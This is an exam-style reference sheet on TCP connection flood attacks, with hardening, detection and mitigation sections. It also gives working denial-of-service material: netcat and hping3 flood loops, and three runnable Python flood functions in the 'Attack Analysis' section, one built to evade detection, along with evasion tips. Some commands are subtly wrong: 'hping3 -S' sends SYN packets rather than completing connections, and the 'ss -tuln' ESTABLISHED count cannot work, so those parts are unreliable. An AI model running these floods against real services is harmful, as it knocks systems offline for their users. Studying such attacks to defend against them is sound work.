# TCP Connection Flood Attack

## üìç Attack Classification
- **Category**: Volumetric Attack / Resource Exhaustion
- **OSI Layer**: Layer 4 (Transport)
- **Protocol**: TCP
- **Port**: Any TCP port (commonly 80, 443, 22, 25, 3389)

## üéØ Attack Mechanism
Overwhelms target systems by establishing **excessive simultaneous TCP connections**, consuming server resources including file descriptors, memory, and connection tables until the system cannot handle legitimate connections.

### How it Works:
1. **Connection Establishment**: Rapidly creates legitimate TCP connections
2. **Resource Consumption**: Each connection consumes system resources
3. **Connection Pool Exhaustion**: Server reaches connection limits
4. **Service Degradation**: New legitimate connections are refused

## üîç Key Characteristics
- **Legitimate Connections**: Uses proper TCP 3-way handshake
- **Resource Intensive**: High memory and file descriptor usage
- **Application Specific**: Targets specific services and ports
- **Persistent Connections**: Maintains connections to maximize impact

## üö® Exam Focus Points

### Critical Numbers:
- **Default Connection Limits**: Apache (150-400), Nginx (1024), IIS (varies)
- **File Descriptor Limits**: Linux default (1024 per process)
- **TCP Backlog**: Typically 128-4096 pending connections
- **Typical Attack Rate**: 100-10,000+ connections/sec
- **Memory per Connection**: 4-16KB average

### Common Exam Questions:
- **Q**: What is the primary resource consumed in TCP connection floods?
- **A**: File descriptors, memory, and connection table entries
- **Q**: How does this differ from SYN flood attacks?
- **A**: Completes full TCP handshake vs. half-open connections
- **Q**: What is the TCP backlog queue?
- **A**: Queue holding incomplete connection requests

### Attack Components:
- **Full Handshake**: SYN ‚Üí SYN-ACK ‚Üí ACK completion
- **Connection Maintenance**: Keeping connections alive
- **Multiple Sources**: Distributed connection attempts
- **Port Targeting**: Focusing on specific services

## ‚ö° Attack Variations

### Slow Connection Flood:
- **Method**: Establish connections slowly to avoid detection
- **Impact**: Long-term resource exhaustion
- **Detection**: Difficult due to low rate
- **Stealth**: Appears like normal traffic increase

### Burst Connection Flood:
- **Method**: Rapid connection establishment bursts
- **Impact**: Immediate resource exhaustion
- **Detection**: Easier to detect due to traffic spikes
- **Recovery**: Faster recovery when attack stops

### Application-Specific Flood:
- **Method**: Target specific application connection pools
- **Impact**: Application-level service disruption
- **Examples**: Database connections, web server pools
- **Bypass**: May bypass network-level protections

### Keep-Alive Abuse:
- **Method**: Use HTTP keep-alive to maintain connections
- **Impact**: Extended resource consumption
- **Application**: Web servers with persistent connections
- **Duration**: Connections held for extended periods

## üõ°Ô∏è Detection & Mitigation
- **Network Protection**:
  - Connection rate limiting per source IP
  - Connection pool monitoring
  - Anomaly detection systems
  - Load balancing with connection limits

- **System Configuration**:
  - Increase file descriptor limits
  - Optimize TCP parameters
  - Implement connection timeouts
  - Configure connection pooling

### System Hardening:
```bash
# Increase system limits
echo "* soft nofile 65536" >> /etc/security/limits.conf
echo "* hard nofile 65536" >> /etc/security/limits.conf

# TCP tuning for connection floods
echo 'net.core.somaxconn = 4096' >> /etc/sysctl.conf
echo 'net.ipv4.tcp_max_syn_backlog = 4096' >> /etc/sysctl.conf
echo 'net.ipv4.tcp_fin_timeout = 15' >> /etc/sysctl.conf
echo 'net.ipv4.tcp_keepalive_time = 600' >> /etc/sysctl.conf
echo 'net.ipv4.tcp_keepalive_probes = 3' >> /etc/sysctl.conf

# Apply changes
sysctl -p

# iptables connection limiting
iptables -A INPUT -p tcp --dport 80 -m connlimit --connlimit-above 20 --connlimit-mask 24 -j DROP
iptables -A INPUT -p tcp --dport 443 -m connlimit --connlimit-above 20 --connlimit-mask 24 -j DROP
```

## üîß Attack Tools & Commands
- **hping3**: Connection flood testing
- **netcat**: Multiple connection establishment
- **Custom Scripts**: Automated connection flooding
- **Load Testing Tools**: JMeter, Apache Bench

### Manual Testing:
```bash
# Basic connection flood with netcat
for i in {1..1000}; do
    nc target_ip 80 &
done

# Using hping3 for connection establishment
hping3 -S -p 80 --flood target_ip

# Slow connection flood
for i in {1..100}; do
    (sleep $((RANDOM % 10)); nc target_ip 80) &
done

# HTTP keep-alive connection flood
for i in {1..500}; do
    echo -e "GET / HTTP/1.1\r\nHost: target\r\nConnection: keep-alive\r\n\r\n" | nc target_ip 80 &
done

# Monitor connection count
watch 'ss -tuln | grep -c ESTABLISHED'
```

## üí° Historical Context
- **Early Internet**: Simple connection exhaustion attacks
- **Web Era**: HTTP-specific connection flooding
- **Modern Applications**: Database and API connection pools
- **Cloud Age**: Distributed connection flood campaigns

## üìä Connection Flood Impact Matrix
| Target Type | Connections Needed | Primary Impact | Recovery Time |
|-------------|-------------------|----------------|---------------|
| Small Web Server | 100-500 | Complete outage | 1-5 minutes |
| Database Server | 50-200 | Query timeouts | 5-15 minutes |
| Mail Server | 200-1000 | Mail delays | 2-10 minutes |
| SSH Server | 10-50 | Login failures | 30 seconds-2 minutes |

## üéØ Target Selection
Preferred targets:
- **Web servers** with limited connection pools
- **Database servers** with connection limits
- **Application servers** with fixed thread pools
- **Mail servers** with SMTP connection limits
- **Remote access services** (SSH, RDP, VNC)

## ‚ö†Ô∏è Vulnerable Configurations
- **Default connection limits**: Using system defaults
- **No connection monitoring**: Lack of visibility
- **Unlimited keep-alive**: No timeout configuration
- **Poor resource management**: Inefficient connection handling

## üîç Detection Indicators
- **High connection counts** from single sources
- **Rapid connection establishment** patterns
- **Resource exhaustion** alerts
- **Service response degradation**
- **File descriptor exhaustion** errors

### Detection Commands:
```bash
# Monitor active connections
ss -tuln | grep ESTABLISHED | wc -l

# Check connections per IP
ss -tuln state established | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -nr

# Monitor file descriptor usage
lsof | wc -l

# Check system limits
ulimit -n

# Monitor connection states
ss -s

# Apache connection monitoring
apache2ctl status | grep "requests currently being processed"

# Nginx connection monitoring
curl http://localhost/nginx_status
```

## üåê Network Impact
- **Bandwidth Consumption**: Low to moderate
- **Connection Table**: High utilization
- **System Memory**: Moderate to high usage
- **CPU Usage**: Low to moderate
- **File Descriptors**: High consumption

## üí° Defense Strategy
1. **Connection Limiting**: Per-IP and global limits
2. **Resource Monitoring**: Real-time connection tracking
3. **Timeout Optimization**: Aggressive connection timeouts
4. **Load Balancing**: Distribute connection load
5. **Rate Limiting**: Control connection establishment rates

## üîß Verification Commands
```bash
# Test connection limits
for i in {1..100}; do nc -w 1 target_ip 80 & done; wait

# Check current connections
netstat -an | grep :80 | grep ESTABLISHED | wc -l

# Monitor resource usage during attack
watch 'ps aux | grep apache2 | wc -l'

# Test connection timeout
timeout 30 nc target_ip 80

# Check system resource limits
cat /proc/sys/fs/file-max
cat /proc/sys/net/core/somaxconn
```

## üìà Attack Metrics
- **Connection Rate**: 50-5,000 connections/sec
- **Memory Impact**: 10-500MB depending on scale
- **CPU Impact**: 10-30% utilization increase
- **File Descriptor Usage**: Up to system limits
- **Service Response**: 100-1000% latency increase

## üîÑ Advanced Evasion
- **Distributed Sources**: Multiple IP addresses
- **Connection Rotation**: Regularly close/reopen connections
- **Legitimate Requests**: Mix with real application traffic
- **Timing Variation**: Randomize connection intervals
- **Protocol Compliance**: Proper HTTP/application protocols

## üî¨ Attack Analysis
### Python Script Examples:
```python
import socket
import threading
import time
import random

def connection_flood_basic(target_ip, target_port, num_connections):
    """Basic TCP connection flood"""
    connections = []
    
    for i in range(num_connections):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((target_ip, target_port))
            connections.append(sock)
            print(f"Connection {i+1} established")
        except Exception as e:
            print(f"Connection {i+1} failed: {e}")
            
    # Keep connections alive
    print(f"Maintaining {len(connections)} connections...")
    input("Press Enter to close connections...")
    
    for sock in connections:
        sock.close()

def slow_connection_flood(target_ip, target_port, num_connections, delay_range=(1, 10)):
    """Slow connection flood to avoid detection"""
    def create_connection(conn_id):
        delay = random.uniform(*delay_range)
        time.sleep(delay)
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target_ip, target_port))
            print(f"Slow connection {conn_id} established after {delay:.2f}s")
            # Keep connection alive for extended period
            time.sleep(300)  # 5 minutes
            sock.close()
        except Exception as e:
            print(f"Slow connection {conn_id} failed: {e}")
    
    threads = []
    for i in range(num_connections):
        thread = threading.Thread(target=create_connection, args=(i,))
        thread.daemon = True
        thread.start()
        threads.append(thread)
    
    # Wait for all threads
    for thread in threads:
        thread.join()

def http_keepalive_flood(target_ip, target_port, num_connections):
    """HTTP Keep-Alive connection flood"""
    def create_http_connection(conn_id):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target_ip, target_port))
            
            # Send HTTP request with keep-alive
            request = (
                "GET / HTTP/1.1\r\n"
                f"Host: {target_ip}\r\n"
                "Connection: keep-alive\r\n"
                "Keep-Alive: timeout=600, max=1000\r\n"
                "\r\n"
            )
            
            sock.send(request.encode())
            
            # Read response to maintain connection
            response = sock.recv(1024)
            print(f"HTTP connection {conn_id} established and maintained")
            
            # Keep connection alive
            time.sleep(600)  # 10 minutes
            sock.close()
            
        except Exception as e:
            print(f"HTTP connection {conn_id} failed: {e}")
    
    threads = []
    for i in range(num_connections):
        thread = threading.Thread(target=create_http_connection, args=(i,))
        thread.daemon = True
        thread.start()
        threads.append(thread)
        time.sleep(0.1)  # Small delay between connections
    
    for thread in threads:
        thread.join()

# Usage examples (for testing purposes only)
# connection_flood_basic("192.168.1.100", 80, 100)
# slow_connection_flood("192.168.1.100", 80, 50, (5, 30))
# http_keepalive_flood("192.168.1.100", 80, 200)
```

## üõ†Ô∏è Mitigation Best Practices
- **Connection Pooling**: Implement efficient connection management
- **Rate Limiting**: Per-source connection rate controls
- **Resource Monitoring**: Real-time connection and resource tracking
- **Timeout Configuration**: Aggressive timeout settings
- **Load Balancing**: Distribute connection load across servers
- **DDoS Protection**: Cloud-based connection flood protection

## üîç Forensic Analysis
- **Connection Logs**: Analyze connection patterns and sources
- **Resource Metrics**: Monitor memory, CPU, and file descriptor usage
- **Network Flow**: Track connection establishment rates
- **Application Logs**: Check for connection pool exhaustion
- **System Metrics**: Analyze system performance during attack

## üìã Response Checklist
1. **Immediate**: Implement emergency connection limits
2. **Short-term**: Block obvious attack sources
3. **Medium-term**: Optimize server configuration and limits
4. **Long-term**: Deploy connection flood protection systems
5. **Continuous**: Monitor connection patterns and resource usage
